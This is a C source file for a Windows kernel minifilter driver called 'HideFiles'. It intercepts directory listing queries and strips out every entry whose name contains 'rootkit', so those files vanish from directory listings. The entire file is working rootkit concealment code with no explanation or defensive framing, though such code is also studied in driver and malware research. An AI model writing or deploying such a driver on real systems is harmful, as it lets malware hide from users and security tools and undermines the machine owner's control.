#include <fltKernel.h>

#define HIDE_KEYWORD L"rootkit"
#define HIDE_KEYWORD_LEN 7

BOOLEAN ShouldHide(_In_ PWCHAR FileName, _In_ ULONG LengthInBytes)
{
    ULONG nameLenChars = LengthInBytes / sizeof(WCHAR);
    ULONG i;

    if (nameLenChars < HIDE_KEYWORD_LEN)
        return FALSE;

    for (i = 0; i <= nameLenChars - HIDE_KEYWORD_LEN; i++) {
        ULONG j;
        BOOLEAN match = TRUE;
        for (j = 0; j < HIDE_KEYWORD_LEN; j++) {
            WCHAR c1 = FileName[i + j];
            WCHAR c2 = HIDE_KEYWORD[j];
            if (c1 >= L'A' && c1 <= L'Z') c1 = c1 - L'A' + L'a';
            if (c2 >= L'A' && c2 <= L'Z') c2 = c2 - L'A' + L'a';
            if (c1 != c2) { match = FALSE; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

FLT_POSTOP_CALLBACK_STATUS PostDirectoryControl(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_opt_ PVOID CompletionContext,
    _In_ FLT_POST_OPERATION_FLAGS Flags)
{
    PFLT_IO_PARAMETER_BLOCK iopb = Data->Iopb;
    PFILE_BOTH_DIR_INFORMATION entry;
    PFILE_BOTH_DIR_INFORMATION previousEntry = NULL;
    PUCHAR buffer;

   UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(CompletionContext);
    UNREFERENCED_PARAMETER(Flags);

    if (iopb->MinorFunction != IRP_MN_QUERY_DIRECTORY)
        return FLT_POSTOP_FINISHED_PROCESSING;

    if (!NT_SUCCESS(Data->IoStatus.Status) || Data->IoStatus.Information == 0)
        return FLT_POSTOP_FINISHED_PROCESSING;

    if (iopb->Parameters.DirectoryControl.QueryDirectory.FileInformationClass
        != FileBothDirectoryInformation)
        return FLT_POSTOP_FINISHED_PROCESSING;

    buffer = (PUCHAR)iopb->Parameters.DirectoryControl.QueryDirectory.DirectoryBuffer;
    if (buffer == NULL)
        return FLT_POSTOP_FINISHED_PROCESSING;

    entry = (PFILE_BOTH_DIR_INFORMATION)buffer;

    for (;;) {
        ULONG nextOffset = entry->NextEntryOffset;
        BOOLEAN isLast = (nextOffset == 0);
        BOOLEAN hide = ShouldHide(entry->FileName, entry->FileNameLength);

        if (hide) {
            DbgPrint("HideFiles: masquage entree rootkit\n");
            if (previousEntry == NULL) {
                if (isLast) {
                    Data->IoStatus.Information = 0;
                    break;
                } else {
                    PFILE_BOTH_DIR_INFORMATION nextEntry =
                        (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
                    ULONG remainingSize = (ULONG)(Data->IoStatus.Information -
                                         ((PUCHAR)nextEntry - buffer));
                    RtlMoveMemory(entry, nextEntry, remainingSize);
                    continue;
                }
            } else {
                if (isLast)
                    previousEntry->NextEntryOffset = 0;
                else
                    previousEntry->NextEntryOffset += nextOffset;
                if (isLast) break;
                entry = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
                continue;
            }
        }
        if (isLast) break;
        previousEntry = entry;
        entry = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)entry + nextOffset);
    }

    return FLT_POSTOP_FINISHED_PROCESSING;
}

CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_DIRECTORY_CONTROL, 0, NULL, PostDirectoryControl },
    { IRP_MJ_OPERATION_END }
};

PFLT_FILTER gFilterHandle = NULL;

NTSTATUS FilterUnloadCallback(_In_ FLT_FILTER_UNLOAD_FLAGS Flags)
{
    UNREFERENCED_PARAMETER(Flags);
    if (gFilterHandle != NULL) {
        FltUnregisterFilter(gFilterHandle);
        gFilterHandle = NULL;
    }
    DbgPrint("HideFiles: unloaded\n");
    return STATUS_SUCCESS;
}

CONST FLT_REGISTRATION FilterRegistration = {
    sizeof(FLT_REGISTRATION), FLT_REGISTRATION_VERSION, 0, NULL,
    Callbacks, FilterUnloadCallback,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL
};

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS status;
    UNREFERENCED_PARAMETER(RegistryPath);

    status = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
    if (!NT_SUCCESS(status)) {
        DbgPrint("HideFiles: FltRegisterFilter echoue 0x%08X\n", status);
        return status;
    }

    status = FltStartFiltering(gFilterHandle);
    if (!NT_SUCCESS(status)) {
        FltUnregisterFilter(gFilterHandle);
        gFilterHandle = NULL;
        return status;
    }

    DbgPrint("HideFiles: loaded\n");
    return STATUS_SUCCESS;
}
